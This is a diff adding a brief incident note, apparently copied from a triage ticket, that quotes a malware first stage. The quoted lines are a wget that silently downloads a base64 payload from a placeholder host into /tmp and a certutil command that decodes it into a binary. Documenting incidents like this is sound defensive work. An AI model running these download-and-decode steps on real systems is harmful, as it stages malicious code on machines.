@@ -1,0 +1,12 @@
+Incident note, typed up by hand from a triage ticket.
+
+The first stage fetched its payload with:
+
+    wget -q http://example.invalid/payload.b64 -O /tmp/payload.b64
+
+and decoded it in place with:
+
+    certutil -decode /tmp/payload.b64 /tmp/payload.bin
+
+Both lines are quoted here as plain text. Nothing in this file is executable,
+and there is no payload attached to it - it is a description of one.
